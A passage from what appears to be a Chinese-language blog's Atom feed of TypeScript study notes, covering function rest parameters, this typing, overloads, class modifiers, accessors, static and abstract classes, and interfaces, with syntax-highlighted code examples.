class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: <span class="built_in">number</span>, ...restArgs: <span class="built_in">number</span>[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> total = x;</span><br><span class="line">    restArgs.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        total += item</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>); <span class="comment">// -&gt; 15</span></span><br></pre></td></tr></table></figure><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><p>关于 <code>this</code> 这里不说太多，网上关于它的文章太多了。<br>关于使用 <code>箭头函数</code> 对 <code>this</code> 的影响可以查看我前面写的一片文章<a href="https://thenightelf.github.io/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">箭头函数</a>;</p><p><code>typescript</code> 中对于函数 <code>this</code> 的处理放在了参数中进行约束。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Card &#123;</span><br><span class="line">    suit: <span class="built_in">string</span>;</span><br><span class="line">    card: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Deck &#123;</span><br><span class="line">    suits: <span class="built_in">string</span>[];</span><br><span class="line">    cards: <span class="built_in">number</span>[];</span><br><span class="line">    createCardPicker(<span class="keyword">this</span>: Deck): <span class="function"><span class="params">()</span> =&gt;</span> Card;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> deck: Deck = &#123;</span><br><span class="line">    suits: [<span class="string">"hearts"</span>, <span class="string">"spades"</span>, <span class="string">"clubs"</span>, <span class="string">"diamonds"</span>],</span><br><span class="line">    cards: <span class="built_in">Array</span>(<span class="number">52</span>),</span><br><span class="line">    <span class="comment">// 在参数中约定 this 为 Deck 类型</span></span><br><span class="line">    createCardPicker: <span class="function"><span class="keyword">function</span>(<span class="params"><span class="keyword">this</span>: Deck</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> pickedCard = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">52</span>);</span><br><span class="line">            <span class="keyword">let</span> pickedSuit = <span class="built_in">Math</span>.floor(pickedCard / <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;suit: <span class="keyword">this</span>.suits[pickedSuit], card: pickedCard % <span class="number">13</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cardPicker = deck.createCardPicker();</span><br><span class="line"><span class="keyword">let</span> pickedCard = cardPicker();</span><br><span class="line"></span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard.card + <span class="string">" of "</span> + pickedCard.suit);</span><br></pre></td></tr></table></figure><h4 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h4><p>不同于 <code>javascript</code> 的函数重载，<code>typescript</code> 中重复的对于一个函数进行定义，只要 <code>参数与返回值类型</code> 不同，就不会相互覆盖。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">say(); <span class="comment">// -&gt; hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typescript</span></span><br><span class="line"><span class="comment">// 官方的例子比较直接，这里直接使用官方的例子</span></span><br><span class="line"><span class="keyword">let</span> suits = [<span class="string">"hearts"</span>, <span class="string">"spades"</span>, <span class="string">"clubs"</span>, <span class="string">"diamonds"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于函数 pickCard 的参数与返回值进行约束</span></span><br><span class="line"><span class="comment">// 约束参数类型为 &#123;suit: string; card: number; &#125;[] 类型时，返回值类型为 number</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickCard</span>(<span class="params">x: &#123;suit: <span class="built_in">string</span>; card: <span class="built_in">number</span>; &#125;[]</span>): <span class="title">number</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 约束参数类型为 number 类型时，返回值类型为 &#123;suit: string; card: number; &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickCard</span>(<span class="params">x: <span class="built_in">number</span></span>): </span>&#123;suit: <span class="built_in">string</span>; card: <span class="built_in">number</span>; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主体处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickCard</span>(<span class="params">x</span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x == <span class="string">"object"</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> pickedCard = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * x.length);</span><br><span class="line">        <span class="keyword">return</span> pickedCard;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> x == <span class="string">"number"</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> pickedSuit = <span class="built_in">Math</span>.floor(x / <span class="number">13</span>);</span><br><span class="line">        <span class="keyword">return</span> &#123; suit: suits[pickedSuit], card: x % <span class="number">13</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myDeck = [&#123; suit: <span class="string">"diamonds"</span>, card: <span class="number">2</span> &#125;, &#123; suit: <span class="string">"spades"</span>, card: <span class="number">10</span> &#125;, &#123; suit: <span class="string">"hearts"</span>, card: <span class="number">4</span> &#125;];</span><br><span class="line"><span class="keyword">let</span> pickedCard1 = myDeck[pickCard(myDeck)];</span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard1.card + <span class="string">" of "</span> + pickedCard1.suit);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pickedCard2 = pickCard(<span class="number">15</span>);</span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard2.card + <span class="string">" of "</span> + pickedCard2.suit);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// -&gt; error，没有一个重载的参数约束为 string</span></span><br><span class="line"><span class="keyword">let</span> pickedCard3 = pickCard(<span class="string">'15'</span>);</span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard3.card + <span class="string">" of "</span> + pickedCard3.suit);</span><br></pre></td></tr></table></figure></p><p><strong>这里需要注意的是</strong>：如果通过重载对函数进行约束之后，那么该函数只能接受重载的定义类型。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将会介绍 &lt;code&gt;typescript&lt;/code&gt; 中函数的相关内容。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(三)</title>
    <link href="https://github.com/TheNightElf/2017/01/22/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/01/22/Typescript学习日记（三）/</id>
    <published>2017-01-22T07:51:19.000Z</published>
    <updated>2018-01-23T09:39:34.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。<br><a id="more"></a></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。</p><h4 id="类的集成"><a href="#类的集成" class="headerlink" title="类的集成"></a>类的集成</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    name: <span class="built_in">string</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Son <span class="keyword">extends</span> Super &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 ts 中，子类继承父类，如果之类中声明了 构造器(constructor) 则必须调用 super()</span></span><br><span class="line">    <span class="comment">// 否则 ts 会抛出错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="公共，私有与受保护的修饰符"><a href="#公共，私有与受保护的修饰符" class="headerlink" title="公共，私有与受保护的修饰符"></a>公共，私有与受保护的修饰符</h4><p><strong>默认值 public</strong></p><p>如果一个类中的成员没有显示的表明修饰符，那么默认他们都是 <code>public</code>。<br>上面的例子和下面的效果是一致的：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    <span class="keyword">public</span> name: <span class="built_in">string</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>私有属性 private</strong></p><p>如果一个类中的成员被标记为 <code>private</code>，那么它就不能在该类的外部被访问，因为它是私有的。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    <span class="keyword">private</span> name: <span class="built_in">string</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Super(<span class="string">'Bird'</span>).name)</span><br></pre></td></tr></table></figure><p><strong>受保护属性 protected</strong></p><p><code>protected</code> 与 <code>private</code> 的行为相似，但是 <code>protected</code> 的属性在 <code>子类内部</code> 中仍然可以访问。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    <span class="keyword">protected</span> name: <span class="built_in">string</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Son <span class="keyword">extends</span> Super &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handle() &#123;</span><br><span class="line">        <span class="comment">// success</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 能成功输出</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Son().handle)</span><br><span class="line"></span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Son().name)</span><br></pre></td></tr></table></figure><p>构造函数被标记为 <code>protected</code> 时，该类不能被实例化，但可以被继承，继承它的之类可以被实例化。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    <span class="keyword">protected</span> name: <span class="built_in">string</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Son <span class="keyword">extends</span> Super &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">super</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handle() &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> S = <span class="keyword">new</span> Super(); <span class="comment">// error, super是被保护的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Son(); <span class="comment">// success</span></span><br></pre></td></tr></table></figure><p><strong>只读属性 readonly</strong></p><p>只读属性不能被修改，必须在 <code>声明时或者构造函数</code> 里被初始化。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    name: <span class="built_in">string</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> S = <span class="keyword">new</span> Super(<span class="string">'Jhon'</span>);</span><br><span class="line">s.name = <span class="string">'Carl'</span>; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><p><strong>参数属性</strong></p><p>在上面的例子中，我们总会声明一个 <code>name</code> 之后再通过构造器赋值。这种做法未免有些麻烦，通过 <code>参数属性</code> 我们可以将声明和赋值结合。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> name: <span class="built_in">string</span></span>) &#123; &#125; <span class="comment">// 直接在构造函数的参数中进行 声明、赋值</span></span><br><span class="line">    fly(: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>储存器</strong></p><p>通过储存器，我们可以修改上文中提到的 <code>private</code> 属性。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="keyword">private</span> name: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123; <span class="keyword">this</span>.name = n &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">get</span> name(): <span class="built_in">string</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">set</span> name(n: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Super(<span class="string">'Jhon'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(s.name); <span class="comment">// -&gt; 'Jhon'</span></span><br><span class="line"></span><br><span class="line">s.name = <span class="string">'Carl'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s.name); <span class="comment">// -&gt; 'Carl'</span></span><br></pre></td></tr></table></figure><p><strong>静态属性 static</strong></p><p>上面的例子中属性大多都是实例化之后才能访问到的属性，通过 <code>static</code> 我们可以给类设置静态属性。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="keyword">static</span> name = <span class="string">'Jhon'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>) &#123;  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Super.name); <span class="comment">// -&gt; 'Jhon'</span></span><br></pre></td></tr></table></figure><p><strong>抽象类 abstract</strong></p><p>抽象类作为其它子类的父类使用，不能被实例化；不同于接口，抽象类可以包含成员的实现细节。<br>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似，两者都是定义方法签名但不包含方法体。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> Super &#123;</span><br><span class="line">    <span class="keyword">abstract</span> name: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> fly(): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Son <span class="keyword">extends</span> Super &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">super</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eat():<span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> S = <span class="keyword">new</span> Super(); <span class="comment">// -&gt; error，抽象类不能被实例化</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Son(); <span class="comment">// -&gt; success</span></span><br><span class="line"></span><br><span class="line">s.fly(); <span class="comment">// -&gt; success </span></span><br><span class="line">s.eat(); <span class="comment">// -&gt; error, 抽象类中没有 eat 方法</span></span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><code>typescript</code> 中的类其实就是 <code>javascript</code> 中的构造函数；他们的用法完全相似，只不过 <code>typescript</code> 给构造函数添加了一些后端语言才有的 <code>修饰符</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;typescript&lt;/code&gt; 中的类与 &lt;code&gt;ES6&lt;/code&gt; 中的 &lt;code&gt;class&lt;/code&gt; 功能及使用基本一致；不过 &lt;code&gt;typescript&lt;/code&gt; 对于属性的定义却是使用了一些后端语言的关键字。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(二)</title>
    <link href="https://github.com/TheNightElf/2017/01/18/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/01/18/Typescript学习日记（二）/</id>
    <published>2017-01-18T09:59:42.000Z</published>
    <updated>2018-01-23T09:39:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>本篇介绍 <code>typescript</code> 中接口的使用方式。<br><a id="more"></a></p><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口(interface)"></a>接口(interface)</h3><p><code>TypeScript</code>的核心原则之一是对值所具有的结构进行类型检查。接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。<br>基础类型是为简单的变量定义类型，<strong>通常的，接口就是为你所定义的对象(参数、函数等)的添加类型的约束。</strong><br>按照 typescript 的默认约定，接口通常是以 <code>驼峰命名方式，大写字母开头</code> 的方式定义。</p><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个接口约束</span></span><br><span class="line"><span class="keyword">interface</span> T &#123;</span><br><span class="line">    num: <span class="built_in">number</span>;</span><br><span class="line">    str: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数的接受的参数中，num必须为number类型，str必须为string类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: T</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> arg.num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接把约束条件写在函数参数中，为了可读性，推荐在外面定义</span></span><br><span class="line"><span class="comment">// eg:</span></span><br><span class="line"><span class="comment">// function demo(arg: &#123; num: number; str: string &#125;) &#123;</span></span><br><span class="line"><span 